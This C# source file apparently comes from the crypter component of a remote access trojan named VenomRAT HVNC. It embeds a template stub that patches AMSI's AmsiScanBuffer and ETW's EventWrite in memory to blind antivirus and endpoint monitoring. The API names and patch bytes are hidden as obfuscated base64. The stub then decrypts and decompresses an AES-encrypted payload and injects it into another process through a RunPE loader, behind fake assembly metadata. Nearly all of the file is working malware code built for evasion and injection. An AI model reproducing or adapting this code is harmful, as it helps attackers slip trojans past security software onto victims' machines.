namespace VenomRAT_HVNC.Crypter.Other;

public class Settings
{
    public static string Stub =
        "using System;\nusing System.IO;\nusing System.IO.Compression;\nusing System.Linq;\nusing System.Reflection;\nusing System.Runtime.InteropServices;\nusing System.Security.Cryptography;\nusing System.Text;\n\n\n[assembly: AssemblyTitle(\"#AssemblyTitle#\")]\n[assembly: AssemblyDescription(\"#AssemblyDescriptions#\")]\n[assembly: AssemblyConfiguration(\"#AssemblyConfigurations#\")]\n[assembly: AssemblyCompany(\"#AssemblyCompany#\")]\n[assembly: AssemblyProduct(\"#AssemblyProduct#\")]\n[assembly: AssemblyCopyright(\"#AssemblyCopyright#\")]\n[assembly: AssemblyTrademark(\"#AssemblyTrademark#\")]\n[assembly: AssemblyVersion(\"999.998.997.996\")]\n[assembly: AssemblyFileVersion(\"999.998.997.996\")]\n\nnamespace Stub\n{\n    static class Program\n    {\n        [STAThread]\n        static void Main()\n        {\n            string passwordAesCompressStub = \"#PASSWORD_AES_COMPRESS_STUB#\";\n            string payloadAesCompressStub = \"#PAYLOAD_AES_COMPRESS_STUB#\";\n\n            ByPass.Edr();\n            RunPe(Decompress(Decrypt(payloadAesCompressStub, passwordAesCompressStub)));\n        }\n\n        private static void RunPe(byte[] data)\n        {\n            string codeRunPe = \"#CodeRunPE#\";\n            string passwordRunPe = \"#PasswordRunPE#\";\n            string pathProcess = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), \"#PathProcess#\");\n\n            Assembly runpeLoader =\n                Assembly.Load(Decompress(Decrypt(codeRunPe, passwordRunPe)));\n\n            MethodInfo mi = runpeLoader.GetType(\"#NamespaceRunpe#.#ClassRunpe#\").GetMethod(\"#MethodsRunPE#\");\n            object[] parameters = { pathProcess, data };\n            mi.Invoke(null, parameters);\n        }\n\n        public static byte[] Decrypt(string encryptedText, string key)\n        {\n            byte[] encryptedBytes = Convert.FromBase64String(encryptedText);\n            using (AesManaged aes256 = new AesManaged())\n            {\n                using (SHA256CryptoServiceProvider sha256Hash = new SHA256CryptoServiceProvider())\n                {\n                    byte[] hash = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(key));\n                    aes256.KeySize = 256;\n                    aes256.BlockSize = 128;\n                    aes256.Key = hash.Take(aes256.KeySize / 8).ToArray();\n                    aes256.IV = hash.Take(aes256.BlockSize / 8).ToArray();\n                    aes256.Mode = CipherMode.CBC;\n                    byte[] decryptedBytes;\n\n                    using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))\n                    {\n                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes256.CreateDecryptor(),\n                                   CryptoStreamMode.Read))\n                        {\n                            using (MemoryStream tempStream = new MemoryStream())\n                            {\n                                byte[] buffer = new byte[1024];\n                                int read;\n                                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)\n                                {\n                                    tempStream.Write(buffer, 0, read);\n                                }\n\n                                decryptedBytes = tempStream.ToArray();\n                            }\n                        }\n                    }\n\n                    return decryptedBytes;\n                }\n            }\n        }\n\n        public static byte[] Decompress(byte[] compressedData)\n        {\n            using (MemoryStream compressedStream = new MemoryStream(compressedData))\n            {\n                using (MemoryStream decompressedStream = new MemoryStream())\n                {\n                    using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Decompress))\n                    {\n                        gzipStream.CopyTo(decompressedStream);\n                    }\n\n                    return decompressedStream.ToArray();\n                }\n            }\n        }\n    }\n    public class ByPass : StringObf\n    {\n        [DllImport(\"kernel32\")]\n        static extern IntPtr GetProcAddress(\n            IntPtr hModule,\n            string procName);\n\n        [DllImport(\"kernel32\")]\n        static extern IntPtr LoadLibrary(\n            string name);\n\n        [DllImport(\"kernel32\")]\n        static extern bool VirtualProtect(\n            IntPtr lpAddress,\n            UIntPtr dwSize,\n            uint flNewProtect,\n            out uint lpflOldProtect);\n\n        public static void Edr()\n        {\n\n            if (Is64Bit())\n            {\n                PatchMemory(DecodeBase64Str(NameDllAmsi()), DecodeBase64Str(FonctionDllAmsi()),\n                    DecodeBase64Bytes(X64PatchSllAmsi()));\n                PatchMemory(DecodeBase64Str(NameDllEtw()), DecodeBase64Str(FonctionDllEtw()),\n                    DecodeBase64Bytes(X64PatchDllEtw()));\n            }\n            else if (!Is64Bit())\n            {\n                PatchMemory(DecodeBase64Str(NameDllAmsi()), DecodeBase64Str(FonctionDllAmsi()),\n                    DecodeBase64Bytes(X86PatchSllAmsi()));\n                PatchMemory(DecodeBase64Str(NameDllEtw()), DecodeBase64Str(FonctionDllEtw()),\n                    DecodeBase64Bytes(X86PatchDllEtw()));\n            }\n        }\n\n        private static void PatchMemory(string nameDll, string nameFonction, byte[] patch)\n        {\n            IntPtr library = LoadLibrary(nameDll);\n            IntPtr procAddress = GetProcAddress(library, nameFonction);\n            uint output;\n            bool vProtect = VirtualProtect(procAddress, (UIntPtr)patch.Length, 0x40, out output);\n            Marshal.Copy(patch, 0, procAddress, patch.Length);\n        }\n\n        private static bool Is64Bit()\n        {\n            if (IntPtr.Size == 8)\n            {\n                return true;\n            }\n\n            return false;\n        }\n\n        private static string DecodeBase64Str(string input)\n        {\n            return Encoding.ASCII.GetString(Convert.FromBase64String(input));\n        }\n\n        private static byte[] DecodeBase64Bytes(string input)\n        {\n            return Convert.FromBase64String(input);\n        }\n    }\n    public class StringObf\n    {\n        private static string _key = new GenerateKey(256).GenerateStrenghCharacter();\n        private static string Obfuscate(string input)\n        {\n            string obfuscationPattern = _key;\n            var obfuscated = new StringBuilder();\n\n            foreach (char c in input)\n            {\n                obfuscated.Append(obfuscationPattern + c + obfuscationPattern);\n            }\n\n            return obfuscated.ToString();\n        }\n\n        private static string Deobfuscate(string input)\n        {\n            string obfuscationPattern = _key;\n            return input.Replace(obfuscationPattern, \"\");\n        }\n\n        public static string NameDllEtw()\n        {\n            return Deobfuscate(Obfuscate(\"bnRkbGwuZGxs\"));\n        }\n\n        public static string FonctionDllEtw()\n        {\n            return Deobfuscate(Obfuscate(\"RXR3RXZlbnRXcml0ZQ==\"));\n        }\n\n        public static string X64PatchDllEtw()\n        {\n            return Deobfuscate(Obfuscate(\"SDPAww==\"));\n        }\n\n        public static string X86PatchDllEtw()\n        {\n            return Deobfuscate(Obfuscate(\"M8DCFAA=\"));\n        }\n\n        public static string NameDllAmsi()\n        {\n            return Deobfuscate(Obfuscate(\"YW1zaS5kbGw=\"));\n        }\n\n        public static string FonctionDllAmsi()\n        {\n            return Deobfuscate(Obfuscate(\"QW1zaVNjYW5CdWZmZXI=\"));\n        }\n\n        public static string X64PatchSllAmsi()\n        {\n            return Deobfuscate(Obfuscate(\"uFcAB4DD\"));\n        }\n\n        public static string X86PatchSllAmsi()\n        {\n            return Deobfuscate(Obfuscate(\"uFcAB4DCGAA=\"));\n        }\n    }\n    public class GenerateKey\n    {\n        public int SizeOfKey;\n\n        public GenerateKey(int sizeOfKey)\n        {\n            this.SizeOfKey = sizeOfKey;\n        }\n\n        public string GenerateStrenghCharacter()\n        {\n            string abc = \"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789\";\n            string result = \"\";\n            Random\n                rnd = new Random(Guid.NewGuid()\n                    .GetHashCode()); //Pour chaque fois que la fonction est appeller il y a une chaine de caractere different\n            int iter = SizeOfKey;\n            for (int i = 0; i < iter; i++)\n                result += abc[rnd.Next(0, abc.Length)];\n            return result;\n        }\n    }\n}";

    public static string FileNameRunPeDllMain { get; } = "RunPE.dll";
    public static string FileNameRunPeDllTemps { get; } = "Temps.dll";
}